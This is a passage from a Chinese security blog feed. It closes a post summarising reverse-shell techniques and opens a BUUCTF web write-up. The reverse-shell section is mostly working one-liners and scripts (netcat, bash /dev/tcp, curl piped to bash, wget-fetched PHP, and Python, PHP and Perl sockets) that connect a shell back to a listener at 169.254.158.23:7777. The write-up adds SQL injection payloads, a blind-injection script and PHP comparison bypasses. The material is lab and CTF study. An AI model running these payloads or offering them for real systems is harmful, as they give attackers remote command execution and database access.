class="headerlink" title="实验1"></a><strong>实验</strong>1</h3><p>首先在win（客户端）上监听7777端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p>然后在kali（服务端）上一句话反弹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>反弹成功</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002211246793.png" alt="image-20201002211246793"></p><h3 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h3><p>win上监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p>kali上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f;</span><br></pre></td></tr></table></figure><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003140303187.png" alt="image-20201003140303187"></p><p>反弹成功</p><h2 id="curl反弹"><a href="#curl反弹" class="headerlink" title="curl反弹"></a>curl反弹</h2><p>前提要利用bash一句话的情况下使用curl反弹shell</p><p>kali上index文件上含有bash一句话，就可以反弹shell。</p><h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a><strong>实验</strong></h3><p>kali（服务端）上检查是否有bash一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.202.129</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>在win（客户端）上监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p>利用服务端curl反弹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.202.129|bash</span><br></pre></td></tr></table></figure><p>反弹成功</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002225540094.png" alt="image-20201002225540094"></p><h2 id="wget反弹"><a href="#wget反弹" class="headerlink" title="wget反弹"></a>wget反弹</h2><p>其实是利用wget和php脚本一块执行达到反弹</p><h3 id="实验-2"><a href="#实验-2" class="headerlink" title="实验"></a>实验</h3><p>首先在win（应该在任何一台服务器上也行）上有shell.txt，写入以下php内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"localhost"</span>,<span class="number">12345</span>);<span class="comment">//localhost为自己的ip</span></span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先在win（客户端）上监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p>在kali（服务端）上利用wget下载shell.txt，然后执行php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 169.254.158.23:8888&#x2F;shell.txt -O &#x2F;tmp&#x2F;x.php &amp;&amp; php &#x2F;tmp&#x2F;x.php</span><br></pre></td></tr></table></figure><p>反弹成功</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002232826494.png" alt="image-20201002232826494"></p><h2 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h2><p>利用curl</p><p>但这次用的是py脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding: utf-8 -*-</span></span><br><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect(("169.254.158.23",7777)) #更改localhost为自己的ip,端口任意</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call(["/bin/sh","-i"])</span><br></pre></td></tr></table></figure><p>当然也可以直接执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("169.254.158.23",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span><br></pre></td></tr></table></figure><p>效果是一样的</p><h3 id="实验1-1"><a href="#实验1-1" class="headerlink" title="实验1"></a>实验1</h3><p>首先在kali（服务端）上写下py脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding: utf-8 -*-</span></span><br><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect(("169.254.158.23",7777)) #更改localhost为自己的ip,端口任意</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call(["/bin/sh","-i"])</span><br></pre></td></tr></table></figure><p>win（客户端）监听</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp <span class="number">7777</span></span><br></pre></td></tr></table></figure><p>kali（服务端）curl</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.202.129/shell.py|python</span><br></pre></td></tr></table></figure><p>反弹成功</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003131626423.png" alt="image-20201003131626423"></p><h3 id="实验2-1"><a href="#实验2-1" class="headerlink" title="实验2"></a>实验2</h3><p>在win（客户端）监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p>在kali（服务端）输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;169.254.158.23&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure><p>反弹成功</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003133539912.png" alt="image-20201003133539912"></p><h2 id="php反弹"><a href="#php反弹" class="headerlink" title="php反弹"></a>php反弹</h2><p>和python一样利用curl</p><p>php脚本如下，和上面的shell.txt一样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"169.254.158.23"</span>,<span class="number">7777</span>);<span class="comment">//localhost为自己的ip，端口任意</span></span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>也可以执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("169.254.158.23",7777);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h3 id="实验1-2"><a href="#实验1-2" class="headerlink" title="实验1"></a>实验1</h3><p>首先在kali（服务端）写下php脚本，存为shell.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"169.254.158.23"</span>,<span class="number">7777</span>);<span class="comment">//localhost为自己的ip，端口任意</span></span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在win（客户端）监听端口</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp <span class="number">7777</span></span><br></pre></td></tr></table></figure><p>kali（服务端）curl反弹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.202.129/shell.txt|php</span><br></pre></td></tr></table></figure><p>反弹成功</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003132843970.png" alt="image-20201003132843970"></p><h3 id="实验2-2"><a href="#实验2-2" class="headerlink" title="实验2"></a>实验2</h3><p>win上监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p>kali上执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("169.254.158.23",7777);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><p>反弹成功</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003133806050.png" alt="image-20201003133806050"></p><h2 id="perl反弹"><a href="#perl反弹" class="headerlink" title="perl反弹"></a>perl反弹</h2><p>和上面几个反弹一样</p><p>这里只做一下演示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e 'use Socket;$i="169.254.158.23";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;</span><br></pre></td></tr></table></figure><h3 id="实验-3"><a href="#实验-3" class="headerlink" title="实验"></a>实验</h3><p>在win上监听端口</p><p>在kali上执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e 'use Socket;$i="169.254.158.23";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;</span><br></pre></td></tr></table></figure><p>反弹成功</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上都是最基本的反弹shell</p><p>其实反弹shell还是很灵活的，具体什么样的场景下怎么用还需要自己判断</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近遇到反弹shell，总结一下反弹shell，用来做笔记&lt;/p&gt;
&lt;h1 id=&quot;反弹shell&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="笔记" scheme="https://pz1o.top/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CTF" scheme="https://pz1o.top/tags/CTF/"/>
    
    <category term="反弹shell" scheme="https://pz1o.top/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
    <category term="总结" scheme="https://pz1o.top/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题(Web)</title>
    <link href="https://pz1o.top/2020/09/27/BUU%E5%88%B7%E9%A2%98/"/>
    <id>https://pz1o.top/2020/09/27/BUU%E5%88%B7%E9%A2%98/</id>
    <published>2020-09-27T15:15:28.000Z</published>
    <updated>2020-11-20T14:18:05.259Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="BUU-Web"><a href="#BUU-Web" class="headerlink" title="BUU(Web)"></a>BUU(Web)</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实自己会做完题写一些wp，但奈何自己三天摸鱼两天休息，所以上传上来监督自己学习</p><p>顺便分一下类</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="强网杯-2019-随便注（堆叠注入）"><a href="#强网杯-2019-随便注（堆叠注入）" class="headerlink" title="[强网杯 2019]随便注（堆叠注入）"></a>[强网杯 2019]随便注（堆叠注入）</h2><blockquote><p>堆叠注入：</p><p>分号（；）来表示一条sql语句的结束。结束一个sql语句再继续构造下一条语句，可以一起执行。堆叠注入可以执行的是任意的语句。</p></blockquote><p>先来了解一下堆叠注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; #</span><br><span class="line">1&#39; order by 2#</span><br><span class="line">1&#39; union select 1,2#</span><br></pre></td></tr></table></figure><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823154827319.png" alt="image-20200823154827319"></p><p>可以看到过滤了大多数语句，但我们还有show，alert，rename，desc等</p><p>通过看表可以看见两个表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;desc words;#</span><br></pre></td></tr></table></figure><p>words表</p><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823155250757.png" alt="image-20200823155250757"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;desc &#96;1919810931114514&#96;;#  &#x2F;&#x2F;在mysql中数字型需要&#96;&#96;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823180812053.png" alt="image-20200823180812053"></p><p>此时，我们就找见了flag，但问题是怎么拿出flag呢？</p><p>下面操作是骚姿势：</p><p>主要思想是利用回显位置来倒退获取flag，回显肯定是id到words表里面找数据，然后回显，那么我们在查询语句不变的前提下，将flag回显出来？</p><ul><li>把words表改名，把数字表改为words；</li><li>往新words表里面插入一个id参数，这样回显就可以找到id，从而显示出flag</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,data from words where id&#x3D;&#39;id&#39;;</span><br></pre></td></tr></table></figure><p>所以flag还得改成data</p><p>最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table words to word1;rename table &#96;1919810931114514&#96; to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823191000126.png" alt="image-20200823191000126"></p><p><strong>复习一下mysql操作</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#表重命名</span><br><span class="line">rename table o_name to n_name;</span><br><span class="line">#新增字段</span><br><span class="line">alert table table_name add column_name [type];</span><br><span class="line">#修改字段名</span><br><span class="line">alert table table_name change o_name n_name [type];</span><br></pre></td></tr></table></figure><h2 id="SUCTF-2019-EasySQL（堆叠注入）"><a href="#SUCTF-2019-EasySQL（堆叠注入）" class="headerlink" title="[SUCTF 2019]EasySQL（堆叠注入）"></a>[SUCTF 2019]EasySQL（堆叠注入）</h2><p>过滤了很多东西，但依然可以堆叠注入</p><p>找到Flag表</p><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823214702265.png" alt="image-20200823214702265"></p><p>之后就不会做了…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1;set sql_mode&#x3D;pipes_as_concat;</span><br><span class="line">select 1||flag from Flag;</span><br></pre></td></tr></table></figure><blockquote><p>补充系统变量@@sql_mode：是一组mysql支持的基本语法及校验规则<br>PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，也和字符串的拼接函数Concat相类似</p></blockquote><p>原本||是or的意思，这里拼接之后：</p><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823215540471.png" alt="image-20200823215540471"></p><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823215640962.png" alt="image-20200823215640962"></p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>直接万能密码登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1 %23&amp;password&#x3D;1&#39; or 1&#x3D;1%23</span><br></pre></td></tr></table></figure><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823221210961.png" alt="image-20200823221210961"></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>简单的sql注入</p><p>直接union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#</span><br><span class="line">1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;geekuser&quot;),(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;l0ve1ysq1&quot;)#</span><br><span class="line">1&#39; union select 1,(select group_concat(password) from geekuser),(select group_concat(password) from l0ve1ysq1)#</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-BabySQL（过滤关键字）"><a href="#极客大挑战-2019-BabySQL（过滤关键字）" class="headerlink" title="[极客大挑战 2019]BabySQL（过滤关键字）"></a>[极客大挑战 2019]BabySQL（过滤关键字）</h2><p>双写绕过</p><p>查关键字可以先select语句观察哪些被过滤了。</p><p>其中关键字有select，union，or（包括information,password），from，where，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#39; ununionion selselectect  1,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database()),3 #</span><br><span class="line">&#x2F;&#x2F;b4bsql,geekuser</span><br><span class="line">1&#39; ununionion selselectect  1,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;),(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;geekuser&#39;) #</span><br><span class="line">&#x2F;&#x2F;id username password</span><br><span class="line">&#x2F;&#x2F;id username password</span><br><span class="line">1&#39; ununionion selselectect  1,(selselectect group_concat(username,passwoorrd) frfromom b4bsql),(selselectect group_concat(username,passwoorrd) frfromom geekuser) #</span><br><span class="line">flag&#123;1745650a-3c83-4068-a316-f2604dc9e366&#125;</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World（过滤关键字和空格的盲注）"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World（过滤关键字和空格的盲注）" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World（过滤关键字和空格的盲注）"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World（过滤关键字和空格的盲注）</h2><p>简单测试了一下</p><p>发现空格被过滤了，union、and、or也被过滤了，并且发现列有两列，报错只出bool，于是就想到是不是盲注，但首要问题是怎么绕过空格</p><p>以下有几种绕空格的办法</p><blockquote><p>/**/ （） %0a `` tab</p></blockquote><p>这里我们用（）来绕过，接下来就是写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic =<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">"if((mid((select(flag)from(flag)),&#123;0&#125;,1)='&#123;1&#125;'),1,2)"</span>.format(i,j)</span><br><span class="line">        data = &#123;<span class="string">"id"</span>: payload,&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">拿到flag</span><br><span class="line">flag&#123;3ba1b350-3474-44d2-a3cd-52f61aaeca64&#125;</span><br></pre></td></tr></table></figure><p>但我自己写的脚本很诡异，无法检测到-，只能通过payload倒推</p><p>所以又换了一个写了一下,用ascii字符来判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic =<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"if(ascii(mid((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)"</span>.format(i,j);</span><br><span class="line">        data = &#123;<span class="string">"id"</span>: payload,&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            flag += str(chr(j))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p>刚写脚本，对其中原理还不是很熟悉，希望后续能深入学习py</p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>直接看源码</p><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823222031931.png" alt="image-20200823222031931"></p><p>拿flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&#x3D;dog</span><br></pre></td></tr></table></figure><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823222049635.png" alt="image-20200823222049635"></p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>主要说一下两个函数</p><p><strong>strcmp()</strong></p><blockquote><p>strcmp()函数只有在相等的情况下返回0。<br>那么我们传入一个数组，它会返回NULL，而判断使用了== ，而NULL==0是bool(true)，这样就成功绕过。</p></blockquote><p><strong>is_numeric()</strong></p><blockquote><p>is_numeric() 判断变量是否为数字或数字字符串，不仅检查10进制，16进制也可以。<br>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对于第一个空格字符会跳过空格字符判断，接着后面的判断！<br>该函数还可能造成sql注入，例如将‘1 or 1’转换为16进制形式，再传参，就可以造成sql注入</p></blockquote><p>之后就是改cookie，post进password和money</p><p>这里判断money相等用的是strcmp()所以我们可以用数组绕过</p><h2 id="BJDCTF2020-Easy-MD5（ffifdyop）"><a href="#BJDCTF2020-Easy-MD5（ffifdyop）" class="headerlink" title="[BJDCTF2020]Easy MD5（ffifdyop）"></a>[BJDCTF2020]Easy MD5（<strong>ffifdyop</strong>）</h2><p>发了几个数字后没发现什么东西，然后抓包，看见hint</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br></pre></td></tr></table></figure><p>这里想要绕过的话肯定是找万能密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;&#39;&#39; or &#39;123&#39;</span><br></pre></td></tr></table></figure><p>这里的话用的是<strong>ffifdyop</strong>MD5加密后为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or&#39;6É]™é!r,ùíb</span><br></pre></td></tr></table></figure><p>符合万能密码</p><p>进入下一关</p><p>源码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; $GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br></pre></td></tr></table></figure><p>这个可以拿数组过，也可以找一些特殊的如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 